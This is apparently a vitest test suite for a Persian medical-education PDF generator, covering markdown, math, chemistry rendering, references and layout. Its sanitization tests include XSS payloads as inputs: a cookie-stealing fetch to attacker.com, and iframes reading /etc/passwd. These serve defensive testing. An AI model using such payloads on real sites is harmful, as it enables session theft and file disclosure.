import { describe, it, expect } from "vitest";
import {
  PdfGenerationService,
  defaultPdfGenerationService,
} from "./pdf-generation-service.js";
import {
  renderLessonPdfHtml,
  renderChapterPdfHtml,
  markdownToSafeHtml,
  isValidAcademicReference,
  toPersianDigits,
  stripDuplicateLeadingHeading,
  getEstedadFontBase64,
} from "./pdf-template.js";
import {
  renderSmilesToSvg,
  renderReactionSmilesToSvg,
} from "./chemical-svg-renderer.js";

describe("PdfGenerationService", () => {
  it("successfully generates a valid non-empty A4 PDF buffer for a lesson", async () => {
    const pdfBuffer = await defaultPdfGenerationService.generateLessonPdf({
      title: "درس فیزیولوژی غشا",
      courseName: "فیزیولوژی پایه",
      moduleTitle: "فصل ۱: انتقال یون‌ها",
      reference: "کتاب فیزیولوژی گایتون",
      contentMarkdown: `
# مقدمه بر پتانسیل عمل
پتانسیل عمل یک موج دپلاریزاسیون در طول غشای نورون است.

> [!NOTE]
> کانال‌های دریچه‌دار سدیمی نقش اصلی را ایفا می‌کنند.

| یون | غلظت داخل سلولی | غلظت خارج سلولی |
|---|---|---|
| سدیم | 14 میلی‌مولار | 140 میلی‌مولار |
| پتاسیم | 140 میلی‌مولار | 4 میلی‌مولار |
      `.trim(),
    });

    expect(Buffer.isBuffer(pdfBuffer)).toBe(true);
    expect(pdfBuffer.length).toBeGreaterThan(1000);
    // Standard PDF files begin with %PDF-
    expect(pdfBuffer.subarray(0, 5).toString("utf-8")).toBe("%PDF-");
  });

  it("successfully generates a valid PDF buffer for a review summary", async () => {
    const pdfBuffer = await defaultPdfGenerationService.generateReviewSummaryPdf({
      title: "خلاصه مرور مبحث دیابت",
      courseName: "غدد و متابولیسم",
      estimatedReadingMinutes: 5,
      overview: "بررسی جامع فیزیوپاتولوژی و درمان دیابت نوع ۱ و ۲.",
      sections: [
        {
          title: "داروهای خوراکی دیابت",
          keyPoints: ["متفورمین داروی خط اول است", "مهارکننده‌های SGLT2 دفع گلوکز را افزایش می‌دهند"],
          examPoints: ["اسیدوز لاکتیک عارضه نادر ولی خطرناک متفورمین است"],
          comparisons: [
            {
              title: "مقایسه دیابت نوع ۱ و ۲",
              headers: ["ویژگی", "دیابت نوع ۱", "دیابت نوع ۲"],
              rows: [
                ["سن بروز", "معمولاً زیر ۳۰ سال", "معمولاً بالای ۴۰ سال"],
                ["انسولین", "کمبود مطلق", "مقاومت به انسولین"],
              ],
            },
          ],
        },
      ],
      finalTakeaways: ["تشخیص زودهنگام و کنترل قند خون مانع عوارض میکروواسکولار می‌شود."],
    });

    expect(Buffer.isBuffer(pdfBuffer)).toBe(true);
    expect(pdfBuffer.length).toBeGreaterThan(1000);
    expect(pdfBuffer.subarray(0, 5).toString("utf-8")).toBe("%PDF-");
  });

  it("rejects empty lesson content without launching browser or generating invalid PDF", async () => {
    await expect(
      defaultPdfGenerationService.generateLessonPdf({
        title: "درس خالی",
        contentMarkdown: "   ",
      }),
    ).rejects.toThrow("Lesson content is empty or incomplete.");
  });

  it("rejects empty review summary content without launching browser", async () => {
    await expect(
      defaultPdfGenerationService.generateReviewSummaryPdf({
        title: "خلاصه خالی",
      }),
    ).rejects.toThrow("Review summary content is empty or incomplete.");
  });

  it("guarantees browser and page cleanup when PDF rendering fails", async () => {
    const service = new PdfGenerationService({ timeoutMs: 1000 });
    // Invalid input that triggers error
    await expect(service.generatePdfFromHtml("")).rejects.toThrow("HTML content cannot be empty");
  });

  // -------------------------------------------------------------------------
  // Chapter PDF Generation Tests (Phase 2)
  // -------------------------------------------------------------------------
  describe("generateChapterPdf (Phase 2)", () => {
    it("successfully generates a single unified PDF buffer for a complete chapter with multiple sessions", async () => {
      const chapterData = {
        chapterId: "chap-cardio-1",
        chapterTitle: "فصل ۱: فیزیولوژی قلب و عروق",
        courseName: "فیزیولوژی پزشکی",
        organizationName: "دانشگاه علوم پزشکی تهران",
        sessions: [
          {
            id: "sess-2",
            title: "جلسه دوم: الکتروفیزیولوژی قلب",
            sortOrder: 2,
            contentMarkdown: "محتوای جلسه دوم درباره پتانسیل عمل گره سینوسی.",
            estimatedMinutes: 20,
          },
          {
            id: "sess-1",
            title: "جلسه اول: آناتومی عملکردی قلب",
            sortOrder: 1,
            contentMarkdown: "محتوای جلسه اول درباره دریچه‌ها و حفرات قلب.",
            estimatedMinutes: 15,
          },
        ],
      };

      const html = renderChapterPdfHtml(chapterData);
      expect(html).toContain("فصل ۱: فیزیولوژی قلب و عروق");
      expect(html).toContain("فهرست جلسات فصل");
      // Session 1 should appear before Session 2 because of sortOrder sorting
      const posSess1 = html.indexOf("جلسه اول: آناتومی عملکردی قلب");
      const posSess2 = html.indexOf("جلسه دوم: الکتروفیزیولوژی قلب");
      expect(posSess1).toBeGreaterThan(-1);
      expect(posSess2).toBeGreaterThan(-1);
      expect(posSess1).toBeLessThan(posSess2);

      const pdfBuffer = await defaultPdfGenerationService.generateChapterPdf(chapterData);
      expect(Buffer.isBuffer(pdfBuffer)).toBe(true);
      expect(pdfBuffer.length).toBeGreaterThan(1000);
      expect(pdfBuffer.subarray(0, 5).toString("utf-8")).toBe("%PDF-");
    });

    it("rejects chapter PDF generation when chapter has no sessions or all sessions are empty", async () => {
      await expect(
        defaultPdfGenerationService.generateChapterPdf({
          chapterId: "chap-empty",
          chapterTitle: "فصل خالی",
          courseName: "دوره تستی",
          sessions: [],
        }),
      ).rejects.toThrow("Chapter has no sessions for PDF generation.");

      await expect(
        defaultPdfGenerationService.generateChapterPdf({
          chapterId: "chap-blank",
          chapterTitle: "فصل با جلسات سفید",
          courseName: "دوره تستی",
          sessions: [
            { id: "s1", title: "ج ۱", sortOrder: 1, contentMarkdown: "   " },
            { id: "s2", title: "ج ۲", sortOrder: 2, contentMarkdown: "" },
          ],
        }),
      ).rejects.toThrow("Chapter has no sessions with content for PDF generation.");
    });
  });

  // -------------------------------------------------------------------------
  // Educational Rich Markdown Rendering Fidelity (Phase 1)
  // -------------------------------------------------------------------------
  describe("Rich Educational Markdown Fidelity (Phase 1)", () => {
    it("renders all 11 callout variants with Lucide SVG icons and correct styling", () => {
      const calloutMarkdown = `
> [!COMMON-MISTAKE]
> این یک اشتباه رایج دانشجویان است.

> [!WARNING]
> این یک هشدار جدی است.

> [!CONTRAINDICATION]
> مصرف همزمان این دارو ممنوع است.

> [!IMPORTANT]
> این یک نکته بسیار مهم است.

> [!CLINICAL-POINT]
> این یک نکته بالینی است.

> [!DRUG-APPLICATION]
> کاربرد دارویی این ترکیب مشخص است.

> [!KEY-POINT]
> مفهوم کلیدی این مبحث در این بخش بیان شده است.

> [!EDUCATIONAL-TIP]
> این یک نکته آموزشی است.

> [!UNDERSTANDING]
> برای فهم بهتر این بخش به ساختار آن دقت کنید.

> [!SUPPLEMENTARY]
> این توضیح تکمیلی است.

> [!TIP]
> این یک نکته عمومی است.
      `;

      const html = markdownToSafeHtml(calloutMarkdown);

      expect(html).toContain("callout-common-mistake");
      expect(html).toContain("callout-warning");
      expect(html).toContain("callout-contraindication");
      expect(html).toContain("callout-important");
      expect(html).toContain("callout-clinical-point");
      expect(html).toContain("callout-drug-application");
      expect(html).toContain("callout-key-point");
      expect(html).toContain("callout-educational-tip");
      expect(html).toContain("callout-understanding");
      expect(html).toContain("callout-supplementary");
      expect(html).toContain("callout-tip");
      // Icons must be rendered as SVGs
      expect(html).toContain("<svg class=\"callout-icon\"");
    });

    it("renders KaTeX mathematical formulas with calibrated fraction spacing and typography", () => {
      const mathMarkdown = `
فرمول انرژی اینشتین $E = mc^2$ است.

فرمول انتگرال زیر را حل کنید:
$$ \\int_{-\\infty}^{+\\infty} e^{-x^2} dx = \\sqrt{\\pi} $$

فرمول کسر چندطبقه:
$$ \\frac{\\frac{A}{B} + C}{D + \\frac{E}{F}} $$

فرمول با پرانتز: \\( \\lambda = \\frac{h}{p} \\)
      `;

      const html = markdownToSafeHtml(mathMarkdown);
      expect(html).toContain("class=\"katex\"");
      expect(html).toContain("class=\"katex-html\"");
      expect(html).toContain("class=\"mfrac\"");

      // Verify full template includes calibrated KaTeX typography & fraction spacing CSS
      const fullHtml = renderLessonPdfHtml({
        title: "درس ریاضی و فیزیک",
        contentMarkdown: mathMarkdown,
      });
      expect(fullHtml).toContain("direction: ltr !important");
      expect(fullHtml).toContain("unicode-bidi: isolate");
      expect(fullHtml).toContain("padding: 16px 20px !important");
      expect(fullHtml).toContain("overflow-y: visible !important");
    });

    it("renders tables with repeated headers on page breaks and clean spacing", () => {
      const tableMarkdown = `
| نام دارو | دوز مصرفی | نیمه‌عمر |
|---|---|---|
| دیگوکسین | ۰.۲۵ میلی‌گرم | ۳۶ ساعت |
| متوپرولول | ۵۰ میلی‌گرم | ۴ ساعت |
      `;

      const html = markdownToSafeHtml(tableMarkdown);
      expect(html).toContain("<table class=\"content-table\"");
      expect(html).toContain('<th dir="rtl" style="text-align:right">نام دارو</th>');
      expect(html).toContain('<td dir="rtl" style="text-align:right">دیگوکسین</td>');
    });

    it("renders real 2D vector chemical structures (SVG) instead of raw SMILES strings", () => {
      const chemMarkdown = `
\`\`\`chemical
compoundName: آسپیرین
formula: C9H8O4
molecularWeight: 180.16
smiles: CC(=O)Oc1ccccc1C(=O)O
sarHighlights:
  - گروه استیل: مسئول استیلاسیون برگشت‌ناپذیر آنزیم COX-1
\`\`\`
      `;

      const html = markdownToSafeHtml(chemMarkdown);
      expect(html).toContain("academic-chem-card");
      expect(html).toContain("آسپیرین");
      expect(html).toContain("C<sub>9</sub>H<sub>8</sub>O<sub>4</sub>");
      expect(html).toContain("180.16 g/mol");
      // 2D Vector structure viewport must be present with valid SVG
      expect(html).toContain("chem-structure-viewport");
      expect(html).toContain("chem-svg-image");
      expect(html).toContain("<svg");
      expect(html).toContain("viewBox=");
      // Discrete SMILES badge is preserved for reference
      expect(html).toContain("chem-smiles-badge");
      expect(html).toContain("CC(=O)Oc1ccccc1C(=O)O");
      // SAR highlights are rendered with strong feature label
      expect(html).toContain("گروه استیل");
      expect(html).toContain("استیلاسیون");
    });

    it("renders 2D reaction schemes for SMILES and formatted arrows for chemical equations", () => {
      const rxnMarkdown = `
\`\`\`reaction
CC(=O)OCC.O>>CC(=O)O.CCO
\`\`\`

\`\`\`reaction
C6H12O6 + 6O2 -> 6CO2 + 6H2O
\`\`\`
      `;

      const html = markdownToSafeHtml(rxnMarkdown);
      expect(html).toContain("academic-chem-card");
      // 2D SVG scheme for SMILES reaction
      expect(html).toContain("reaction-scheme-viewport");
      expect(html).toContain("reaction-svg-scheme");
      // Formatted equation text with arrow ⟶ and subscripts for textual equation
      expect(html).toContain("reaction-equation-text");
      expect(html).toContain("⟶");
      expect(html).toContain("C<sub>6</sub>H<sub>12</sub>O<sub>6</sub>");
    });

    it("gracefully falls back when SMILES code is malformed without crashing or losing content", () => {
      const malformedMarkdown = `
\`\`\`chemical
compoundName: ترکیب با ساختار مجهول
formula: C20H30
smiles: invalid_smiles_string_xyz
\`\`\`
      `;

      const html = markdownToSafeHtml(malformedMarkdown);
      expect(html).toContain("academic-chem-card");
      expect(html).toContain("ترکیب با ساختار مجهول");
      expect(html).toContain("chem-fallback-notice");
      expect(html).toContain("invalid_smiles_string_xyz");
      expect(html).not.toContain("chem-structure-viewport");
    });
  });

  // -------------------------------------------------------------------------
  // Security & Sanitization Tests (XSS, SSRF, LFI)
  // -------------------------------------------------------------------------
  describe("Security & Sanitization", () => {
    it("escapes malicious scripts, iframes, event handlers, and javascript: links in markdown", () => {
      const maliciousMarkdown = `
# هک تستی <script>alert('xss')</script>
<iframe src="file:///etc/passwd"></iframe>
<img src=x onerror="fetch('https://attacker.com/leak?data='+document.cookie)">
[کلیک کنید](javascript:alert(1))
onload="alert(2)"
      `;

      const safeHtml = markdownToSafeHtml(maliciousMarkdown);

      expect(safeHtml).not.toContain("<script>");
      expect(safeHtml).not.toContain("<iframe");
      expect(safeHtml).not.toContain("<img");
      expect(safeHtml).toMatch(/&lt;script&gt;alert\((&#39;|&#x27;)xss\1\)&lt;\/script&gt;/);
      expect(safeHtml).toContain("&lt;iframe src=&quot;file:///etc/passwd&quot;&gt;&lt;/iframe&gt;");
      expect(safeHtml).toContain("&lt;img src=x onerror=");
    });

    it("renders valid PDF when input contains attack vectors without crashing Chromium or leaking files", async () => {
      const hostileData = {
        title: "درس با بردار حمله <script>alert(1)</script>",
        courseName: "دوره تستی <iframe src='http://evil.com'></iframe>",
        moduleTitle: "فصل ۱ <img src=x onerror=alert(2)>",
        reference: "رفرنس file:///etc/shadow",
        contentMarkdown: `
# تلاش برای نفوذ
<script>window.location='https://evil.com'</script>
<iframe src="file:///etc/passwd"></iframe>
<link rel="stylesheet" href="http://evil.com/leak.css">
<img src="http://evil.com/tracker.png" />
متن درسنامه کاملاً قانونی و علمی
        `.trim(),
      };

      const html = renderLessonPdfHtml(hostileData);

      // Verify that no unescaped tags exist in HTML
      expect(html).not.toContain("<script>window.location");
      expect(html).not.toContain("<iframe src=\"file:///etc/passwd\"");
      expect(html).not.toContain("<img src=\"http://evil.com/tracker.png\"");

      // Generate actual PDF with Chromium to ensure route blocker terminates external requests
      const pdfBuffer = await defaultPdfGenerationService.generateLessonPdf(hostileData);
      expect(Buffer.isBuffer(pdfBuffer)).toBe(true);
      expect(pdfBuffer.length).toBeGreaterThan(1000);
      expect(pdfBuffer.subarray(0, 5).toString("utf-8")).toBe("%PDF-");
    });

    it("preserves inlined Vazirmatn font and Avana logo base64 while blocking external URLs", async () => {
      const html = renderLessonPdfHtml({
        title: "بررسی فونت و لوگو",
        contentMarkdown: "متن کوتاه برای بررسی فونت و لوگو",
      });

      // Contains embedded font and logo as data URIs
      expect(html).toContain("data:font/woff2;base64,");
      expect(html).toContain("data:image/png;base64,");

      // Verify Chromium renders successfully with data: URIs permitted
      const pdfBuffer = await defaultPdfGenerationService.generatePdfFromHtml(html);
      expect(pdfBuffer.subarray(0, 5).toString("utf-8")).toBe("%PDF-");
      expect(pdfBuffer.length).toBeGreaterThan(5000);
    });

    it("verifies visual rendering by capturing page screenshot of Persian typography and layout", async () => {
      const { chromium } = await import("playwright");
      const browser = await chromium.launch({
        headless: true,
        args: ["--no-sandbox", "--disable-setuid-sandbox", "--disable-gpu"],
      });
      const page = await browser.newPage({ viewport: { width: 794, height: 1123 } });
      const html = renderLessonPdfHtml({
        title: "بررسی بصری تایپوگرافی فارسی و واترمارک",
        courseName: "فارماکولوژی قلب و عروق",
        moduleTitle: "فصل ۲: بتابلوکرها",
        reference: "کاتزونگ ۲۰۲۴",
        contentMarkdown: `## مکانیسم اثر
داروهای مسدودکننده بتا با اتصال به گیرنده‌های آدرنرژیک مانع اثر کاتکول‌آمین‌ها می‌شوند.

| دارو | اختصاصیت | حلالیت |
|---|---|---|
| پروپرانولول | غیراختصاصی | بالا |
| آتنولول | بتا ۱ | پایین |

> [!NOTE]
> قطع ناگهانی بتابلوکرها ممکن است باعث ریباند و آنژین صدری شود.
        `.trim(),
      });

      await page.setContent(html, { waitUntil: "networkidle" });
      const screenshot = await page.screenshot({ fullPage: false });
      await browser.close();

      const { writeFileSync, mkdirSync } = await import("node:fs");
      const scratchDir = "/Users/ops/.gemini/antigravity/brain/c764c728-b356-4a9b-a479-fda01a102790/scratch";
      try {
        mkdirSync(scratchDir, { recursive: true });
        writeFileSync(`${scratchDir}/visual_lesson_preview.png`, screenshot);
      } catch {
        // ignore if scratch path not accessible
      }

      expect(screenshot).toBeInstanceOf(Buffer);
      expect(screenshot.length).toBeGreaterThan(10000);
    });

    describe("Academic Reference Validation and Inheritance", () => {
      it("validates academic references correctly", () => {
        expect(isValidAcademicReference("کتاب فیزیولوژی گایتون")).toBe(true);
        expect(isValidAcademicReference("Katzung Pharmacology 15th Ed")).toBe(true);
        expect(isValidAcademicReference(null)).toBe(false);
        expect(isValidAcademicReference(undefined)).toBe(false);
        expect(isValidAcademicReference("")).toBe(false);
        expect(isValidAcademicReference("بدون مرجع")).toBe(false);
        expect(isValidAcademicReference("نامشخص")).toBe(false);
        expect(isValidAcademicReference("test.pdf")).toBe(false);
        expect(isValidAcademicReference("notes.docx")).toBe(false);
        expect(isValidAcademicReference("/uploads/books/reference.pdf")).toBe(false);
      });

      it("handles Case 1: valid references in lesson and chapter with inheritance", () => {
        const chapterHtml = renderChapterPdfHtml({
          chapterTitle: "فصل اول",
          courseName: "فارماکولوژی",
          chapterReference: "منبع فصل گایتون",
          sessions: [
            { id: "s-1", title: "جلسه ۱", sortOrder: 1, contentMarkdown: "متن ۱", reference: "رفرنس اختصاصی جلسه ۱" },
            { id: "s-2", title: "جلسه ۲", sortOrder: 2, contentMarkdown: "متن ۲" },
          ],
        });
        expect(chapterHtml).toContain("منبع فصل گایتون");
        expect(chapterHtml).toContain("رفرنس اختصاصی جلسه ۱");
      });

      it("handles Case 2: inherits course reference when chapter reference is missing", () => {
        const chapterHtml = renderChapterPdfHtml({
          chapterTitle: "فصل دوم",
          courseName: "فیزیولوژی پزشکی",
          courseReference: "کتاب مرجع فیزیولوژی گایتون و هال",
          sessions: [{ id: "s-1", title: "جلسه ۱", sortOrder: 1, contentMarkdown: "متن" }],
        });
        expect(chapterHtml).toContain("کتاب مرجع فیزیولوژی گایتون و هال");
      });

      it("handles Case 3: omits reference section entirely when no reference exists", () => {
        const lessonHtml = renderLessonPdfHtml({
          title: "درس آزمایشی حالت ۳",
          courseName: "دوره جامع",
          reference: null,
          contentMarkdown: "محتوا",
        });
        expect(lessonHtml).not.toContain("مرجع:");
        expect(lessonHtml).not.toContain("بدون مرجع");
        expect(lessonHtml).not.toContain("نامشخص");
      });

      it("handles Case 4: rejects raw filenames and does not render them as references", () => {
        const lessonHtml = renderLessonPdfHtml({
          title: "درس با نام فایل",
          courseName: "دوره جامع",
          reference: "document_presentation_v2.pdf",
          contentMarkdown: "محتوا",
        });
        expect(lessonHtml).not.toContain("document_presentation_v2.pdf");
        expect(lessonHtml).not.toContain("مرجع:");
      });
    });
  });

  // -------------------------------------------------------------------------
  // High-Fidelity PDF Enhancements (Issues 1-8 Regression Suite)
  // -------------------------------------------------------------------------
  describe("High-Fidelity PDF Enhancements (Issues 1-8)", () => {
    it("Issue 1: ensures chemical structure SVG has no mask or mask references that cause zoom disappearance", () => {
      // Aspirin
      const aspirinSvg = renderSmilesToSvg("CC(=O)Oc1ccccc1C(=O)O");
      expect(aspirinSvg).not.toBeNull();
      expect(aspirinSvg).not.toContain("<mask");
      expect(aspirinSvg).not.toContain("mask=");
      // Background circles must be present under atom text
      expect(aspirinSvg).toContain("chem-atom-bg");
      expect(aspirinSvg).toContain("<circle");
      // Double bonds and aromatic circles must be preserved
      expect(aspirinSvg).toContain("<line");

      // Nitrogen-containing molecule (Lidocaine)
      const lidocaineSvg = renderSmilesToSvg("CCN(CC)CC(=O)Nc1c(C)cccc1C");
      expect(lidocaineSvg).not.toBeNull();
      expect(lidocaineSvg).not.toContain("<mask");
      expect(lidocaineSvg).not.toContain("mask=");
      expect(lidocaineSvg).toContain("chem-atom-bg");
      // Nitrogen atom text must be present with its distinct color
      expect(lidocaineSvg).toContain("#2563eb");
      expect(lidocaineSvg).toContain(">N<");

      // Chemical reaction scheme must also be free of masks
      const rxnSvg = renderReactionSmilesToSvg("CC(=O)OCC.O>>CC(=O)O.CCO");
      expect(rxnSvg).not.toBeNull();
      expect(rxnSvg).not.toContain("<mask");
      expect(rxnSvg).not.toContain("mask=");
    });

    it("Issue 2: removes duplicate 'جلسه N:' prefix from Table of Contents while preserving real title", () => {
      const chapterHtml = renderChapterPdfHtml({
        chapterId: "ch-toc-test",
        chapterTitle: "فصل اول",
        courseName: "فارماکولوژی",
        sessions: [
          {
            id: "s-1",
            title: "جلسه ۱: فارماکولوژی دستگاه خودمختار",
            sortOrder: 1,
            contentMarkdown: "محتوا ۱",
          },
          {
            id: "s-2",
            title: "جلسه ۲: گیرنده‌های کولینرژیک",
            sortOrder: 2,
            contentMarkdown: "محتوا ۲",
          },
        ],
      });

      // Must NOT contain duplicate "جلسه ۱: جلسه ۱:"
      expect(chapterHtml).not.toContain("جلسه ۱: جلسه ۱:");
      expect(chapterHtml).not.toContain("جلسه ۲: جلسه ۲:");
      // Must preserve the real session title
      expect(chapterHtml).toContain("جلسه ۱: فارماکولوژی دستگاه خودمختار");
      expect(chapterHtml).toContain("جلسه ۲: گیرنده‌های کولینرژیک");
    });

    it("Issue 3: links Table of Contents items directly to session anchors in the PDF", () => {
      const chapterHtml = renderChapterPdfHtml({
        chapterId: "ch-links-test",
        chapterTitle: "فصل پیوندها",
        courseName: "فارماکولوژی",
        sessions: [
          { id: "s-1", title: "جلسه ۱", sortOrder: 1, contentMarkdown: "متن ۱" },
          { id: "s-2", title: "جلسه ۲", sortOrder: 2, contentMarkdown: "متن ۲" },
        ],
      });

      // Internal links in TOC
      expect(chapterHtml).toContain('<a href="#session-1" class="toc-link">');
      expect(chapterHtml).toContain('<a href="#session-2" class="toc-link">');
      // Target sections in body
      expect(chapterHtml).toContain('id="session-1"');
      expect(chapterHtml).toContain('id="session-2"');
    });

    it("Issue 4: embeds Estedad font as primary typeface in rendered HTML", () => {
      const estedadBase64 = getEstedadFontBase64();
      expect(estedadBase64.length).toBeGreaterThan(500);

      const lessonHtml = renderLessonPdfHtml({
        title: "تست فونت استداد",
        contentMarkdown: "متن به زبان فارسی با فونت استداد.",
      });

      expect(lessonHtml).toContain("font-family: 'Estedad'");
      expect(lessonHtml).toContain("format('woff2')");
      expect(lessonHtml).toContain("body {");
      expect(lessonHtml).toContain("'Estedad'");
    });

    it("Issue 5: renders RTL tables with isolated BiDi cells for mixed English and numbers", () => {
      const mixedTableMarkdown = `
| نام دارو | Formula | دوز (mg) | توضیحات |
|---|---|---|---|
| آسپیرین | C9H8O4 | 100 mg | مهار COX-1 در دوز پایین |
| لیدوکائین | C14H22N2O | 200 mg | بلاک کانال‌های Na+ با پیوند آمیدی |
      `;

      const html = markdownToSafeHtml(mixedTableMarkdown);
      expect(html).toContain('class="table-container" dir="rtl"');
      expect(html).toContain('class="content-table" dir="rtl"');
      expect(html).toContain('<th dir="rtl" style="text-align:right">نام دارو</th>');
      expect(html).toContain('<th dir="rtl" style="text-align:right">Formula</th>');
      // eslint-disable-next-line no-secrets/no-secrets
      expect(html).toContain('<td dir="rtl" style="text-align:right">C9H8O4</td>');
      expect(html).toContain('<td dir="rtl" style="text-align:right">آسپیرین</td>');

      // Check full template CSS for table direction and bidi isolation
      const fullHtml = renderLessonPdfHtml({
        title: "جدول ترکیبی",
        contentMarkdown: mixedTableMarkdown,
      });
      expect(fullHtml).toContain(".content-table {");
      expect(fullHtml).toContain("direction: rtl;");
      expect(fullHtml).toContain("unicode-bidi: isolate;");
      expect(fullHtml).toContain("font-size: 8.2pt;");
      expect(fullHtml).toContain("line-height: 1.55;");
    });

    it("Issue 6: uses Persian numerals in session square badges and metadata", () => {
      expect(toPersianDigits(1)).toBe("۱");
      expect(toPersianDigits(10)).toBe("۱۰");
      expect(toPersianDigits("4 of 10")).toBe("۴ of ۱۰");

      const chapterHtml = renderChapterPdfHtml({
        chapterId: "ch-digits-test",
        chapterTitle: "فصل ارقام فارسی",
        courseName: "فارماکولوژی",
        sessions: [
          { id: "s-1", title: "جلسه اول", sortOrder: 1, contentMarkdown: "متن ۱", estimatedMinutes: 25 },
        ],
      });

      expect(chapterHtml).toContain('<div class="session-number-badge">۱</div>');
      expect(chapterHtml).not.toContain("جلسه ۱ از ۱");
      expect(chapterHtml).toContain("تعداد جلسات: ۱ جلسه");
      expect(chapterHtml).toContain("۲۵ دقیقه مطالعه");
    });

    it("Issue 7: strips duplicate leading heading from session content without deleting educational content", () => {
      const duplicateContent = `# سیستم کولینرژیک

استیل‌کولین میانجی اصلی است.

## مکانیسم اثر
تحریک گیرنده‌های موسکارینی.`;

      // 1. When heading matches session title, the heading is stripped
      const cleaned = stripDuplicateLeadingHeading(duplicateContent, "جلسه ۱: سیستم کولینرژیک");
      expect(cleaned.startsWith("# سیستم کولینرژیک")).toBe(false);
      expect(cleaned).toContain("استیل‌کولین میانجی اصلی است.");
      expect(cleaned).toContain("## مکانیسم اثر");

      // 2. When heading is different, it is completely preserved
      const differentContent = `# مقدمه عمومی

محتوا...`;
      const preserved = stripDuplicateLeadingHeading(differentContent, "جلسه ۱: سیستم کولینرژیک");
      expect(preserved).toBe(differentContent);

      // 3. In chapter HTML, the duplicate title is rendered only once (in header box)
      const chapterHtml = renderChapterPdfHtml({
        chapterId: "ch-dedup",
        chapterTitle: "فصل تست",
        courseName: "فارماکولوژی",
        sessions: [
          {
            id: "s-1",
            title: "جلسه ۱: سیستم کولینرژیک",
            sortOrder: 1,
            contentMarkdown: duplicateContent,
          },
        ],
      });

      // The header box displays the title with stripped prefix and square badge
      expect(chapterHtml).toContain('<div class="session-number-badge">۱</div>');
      expect(chapterHtml).toContain('<h2 class="session-title">سیستم کولینرژیک</h2>');
      // The session-content does NOT duplicate the title as an h1
      expect(chapterHtml).not.toContain('<h1 class="content-h1">سیستم کولینرژیک</h1>');
      expect(chapterHtml).not.toContain('<h1 class="content-h1">جلسه ۱: سیستم کولینرژیک</h1>');
      // But keeps the subheadings and body
      expect(chapterHtml).toContain('<h2 class="content-h2">مکانیسم اثر</h2>');
      expect(chapterHtml).toContain("استیل‌کولین میانجی اصلی است.");
    });

    it("Issue 7: sanitizes invisible and corrupted replacement characters", () => {
      const corruptedInput = "جمع\u00ADیت‌های خاص و اط\u00ADفال با کاراکتر \uFFFD و مارک \uFEFF تست.";
      const cleanedHtml = markdownToSafeHtml(corruptedInput);
      expect(cleanedHtml).not.toContain("\u00AD");
      expect(cleanedHtml).not.toContain("\uFFFD");
      expect(cleanedHtml).not.toContain("\uFEFF");
      expect(cleanedHtml).toContain("جمعیت‌های خاص و اطفال");
    });

    it("Redesign: ensures Avana image logo is embedded in both cover and closing pages", () => {
      const lessonHtml = renderLessonPdfHtml({
        title: "درس با لوگوی کامل",
        contentMarkdown: "محتوا",
      });

      // Cover logo
      expect(lessonHtml).toContain('<img class="cover-logo" src="data:image/png;base64,');
      // Closing logo
      expect(lessonHtml).toContain('<div class="closing-logo-wrap">');
      expect(lessonHtml).toContain('<img class="closing-logo" src="data:image/png;base64,');
      expect(lessonHtml).not.toContain("لوگو یافت نشد");
    });

    it("Redesign: neutralizes Remark-GFM text-align:left while preserving explicit center and right alignments", () => {
      const markdownTable = `
| ستون راست | ستون وسط | ستون چپ صریح | ستون پیش‌فرض |
|:---|:---:|---:|---|
| متن فارسی | متن وسط | متن راست صریح | متن پیش‌فرض |
      `;

      const html = markdownToSafeHtml(markdownTable);
      // Left align is remapped to right
      expect(html).toContain('<td dir="rtl" style="text-align:right">متن فارسی</td>');
      // Explicit center is preserved
      expect(html).toContain('<td dir="rtl" style="text-align:center">متن وسط</td>');
      // Explicit right is preserved
      expect(html).toContain('<td dir="rtl" style="text-align:right">متن راست صریح</td>');
      // Default is right
      expect(html).toContain('<td dir="rtl" style="text-align:right">متن پیش‌فرض</td>');
    });

    it("Redesign: removes unwanted faint gray lines before headings and under h2", () => {
      const markdownWithHrBeforeHeading = `
متن اولیه پاراگراف.

---
## عنوان بخش بعدی
محتوای بعد از عنوان.
      `;

      const html = markdownToSafeHtml(markdownWithHrBeforeHeading);
      // The decorative --- right before ## should be removed
      expect(html).not.toContain('<hr class="content-hr"');

      // The h2 should not have border-bottom: 1px solid #e2e8f0
      const lessonHtml = renderLessonPdfHtml({
        title: "تست بدون خط خاکستری",
        contentMarkdown: markdownWithHrBeforeHeading,
      });
      expect(lessonHtml).not.toContain("h2,\n    .content-h2 {\n      font-size: 14pt;\n      font-weight: 700;\n      color: #0f172a;\n      border-bottom: 1px solid #e2e8f0;");
      expect(lessonHtml).toContain("page-break-inside: avoid;");
      expect(lessonHtml).toContain("table-header-group");
    });

    it("Defect 2 Fix: assigns sequential badge numbers 1, 2, 3 to sessions with 0-based sortOrder", () => {
      const chapterHtml = renderChapterPdfHtml({
        chapterId: "ch-0-based",
        chapterTitle: "فصل دوم: بافت همبند",
        courseName: "بافت‌شناسی",
        sessions: [
          {
            id: "s-0",
            title: "ماده زمینه‌ای",
            sortOrder: 0,
            contentMarkdown: "محتوای جلسه اول",
          },
          {
            id: "s-1",
            title: "سلول‌های بافت همبند",
            sortOrder: 1,
            contentMarkdown: "محتوای جلسه دوم",
          },
          {
            id: "s-2",
            title: "الیاف کلاژن و الاستیک",
            sortOrder: 2,
            contentMarkdown: "محتوای جلسه سوم",
          },
        ],
      });

      // Session 0 (sortOrder: 0) must have badge "۱"
      // Session 1 (sortOrder: 1) must have badge "۲" (NOT "۱"!)
      // Session 2 (sortOrder: 2) must have badge "۳"
      expect(chapterHtml).toContain('<div class="session-number-badge">۱</div>');
      expect(chapterHtml).toContain('<div class="session-number-badge">۲</div>');
      expect(chapterHtml).toContain('<div class="session-number-badge">۳</div>');

      // Anchors must match session-1, session-2, session-3
      expect(chapterHtml).toContain('<a href="#session-1" class="toc-link">');
      expect(chapterHtml).toContain('<a href="#session-2" class="toc-link">');
      expect(chapterHtml).toContain('<a href="#session-3" class="toc-link">');
    });

    it("Defect 2 Fix: restarts session badge numbering at 1 for each chapter independently", () => {
      // Global database sortOrders could be 10, 11, 12 from a later chapter
      const chapterHtml = renderChapterPdfHtml({
        chapterId: "ch-independent",
        chapterTitle: "فصل چهارم",
        courseName: "فیزیولوژی",
        sessions: [
          {
            id: "s-10",
            title: "جلسه اول: کلیات قلب",
            sortOrder: 10,
            contentMarkdown: "متن ۱",
          },
          {
            id: "s-11",
            title: "جلسه دوم: الکتروفیزیولوژی قلب",
            sortOrder: 11,
            contentMarkdown: "متن ۲",
          },
        ],
      });

      expect(chapterHtml).toContain('<div class="session-number-badge">۱</div>');
